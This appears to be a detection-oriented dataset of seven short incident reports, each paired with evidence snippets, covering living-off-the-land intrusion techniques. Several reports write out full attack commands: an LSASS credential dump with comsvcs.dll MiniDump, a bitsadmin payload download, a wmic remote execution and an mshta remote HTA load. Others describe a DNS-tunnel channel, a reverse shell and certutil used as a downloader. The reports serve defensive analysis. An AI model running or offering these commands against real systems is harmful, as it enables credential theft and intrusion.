evidence: Analysts saw the same comsvcs.dll MiniDump invocation on two further servers within the hour
cases.report_text: During the intrusion the operator obtained domain credentials without dropping any custom tooling. On the file server the operator opened an interactive cmd.exe and identified the LSASS process identifier with tasklist. The operator then dumped the process memory with a living-off-the-land technique, running rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 612 C:\Users\Public\lsass.dmp full from the command shell. The dump was written under the Public profile, compressed with the built-in tar utility and deleted after transfer. Analysts saw the same comsvcs.dll MiniDump invocation on two further servers within the hour, each time with a different process identifier. No malware binary was involved, so detection has to rely on the command line rather than file hashes.

evidence: sends it as the leftmost label of a query, for example 4a6f686e2d4c.tunnel-relay.invalid
Each beacon is issued by powershell.exe roughly every ninety seconds
cases.report_text: Telemetry from the finance subnet showed a PowerShell-based implant using DNS as its command channel. The script encodes each outbound message in hexadecimal and sends it as the leftmost label of a query, for example 4a6f686e2d4c.tunnel-relay.invalid, while replies arrive as TXT answers that the script decodes and runs. Each beacon is issued by powershell.exe roughly every ninety seconds, and queries under tunnel-relay.invalid were seen from six hosts. No direct web traffic to the operator infrastructure was recorded, so the DNS log is the only reliable detection source.

evidence: powershell.exe connecting out to 203.0.113.50 on port 4444, a port that is not used by any approved application in the environment
The same address and port pairing was used from two other endpoints in the days that followed
cases.report_text: The operator's reverse shell was started from a PowerShell one-liner on the kiosk host. Network logs show powershell.exe connecting out to 203.0.113.50 on port 4444, a port that is not used by any approved application in the environment, and holding the session open for several hours. The operator chose the non-standard port to avoid the proxy that inspects traffic on ports 80 and 443. The same address and port pairing was used from two other endpoints in the days that followed, and responders confirmed that the listener on 203.0.113.50 was an operator-controlled host.

evidence: The operator launched mshta.exe with a remote HTA, either http://cdn-sync.example/stage.hta or https://cdn-sync.example/stage.hta, which then started powershell.exe to download the next stage
mshta.exe reaching out to a web address is the constant element in all observed cases
cases.report_text: A malicious shortcut delivered by email caused the user's session to start a signed Windows binary rather than a dropper. The operator launched mshta.exe with a remote HTA, either http://cdn-sync.example/stage.hta or https://cdn-sync.example/stage.hta, which then started powershell.exe to download the next stage. The HTA file contains script that spawns a hidden PowerShell process, so analysts tracked both the proxy execution of the HTA and the PowerShell execution that followed. Defenders should expect the URL to change between victims, but mshta.exe reaching out to a web address is the constant element in all observed cases.

evidence: The same /transfer pattern with a C:\ProgramData destination appeared on four hosts
cases.report_text: The loader on the engineering workstation was staged using BITS rather than a browser. The command recorded was bitsadmin.exe /transfer job1 /download /priority high http://files-mirror.example/agent.bin C:\ProgramData\agent.bin, executed from a command shell opened by the operator. Writing the payload into ProgramData rather than a user profile directory let it survive profile clean-up and made it readable by every account on the host. A follow-up scheduled task started the downloaded agent at the next logon. The same /transfer pattern with a C:\ProgramData destination appeared on four hosts.

evidence: The commands were issued both from cmd.exe and from powershell.exe on the pivot host
cases.report_text: Lateral movement from the pivot host to file and domain servers relied on WMI command execution. The operator ran wmic.exe /node:FS02 process call create C:\Users\Public\r.exe against the file server and repeated the same pattern against the domain controller. The commands were issued both from cmd.exe and from powershell.exe on the pivot host, so detection cannot depend on a single parent process. Each invocation started the remote payload within seconds and no remote service installation was needed. The process call create method against remote nodes was observed eleven times over two days.

evidence: certutil.exe, normally used for certificate management, was observed making a direct outbound HTTP connection to 198.51.100.77 on port 80
The same host was contacted by certutil.exe on three workstations within one afternoon
cases.report_text: Endpoint network telemetry showed a signed system utility being abused as a downloader. certutil.exe, normally used for certificate management, was observed making a direct outbound HTTP connection to 198.51.100.77 on port 80 to pull the second-stage payload. The same host was contacted by certutil.exe on three workstations within one afternoon, and no browser or update agent was involved in any of the connections. Analysts assessed the 198.51.100.77 address as an operator staging server. Routine certificate revocation lookups by certutil.exe go to the internal PKI servers and were not part of this activity.
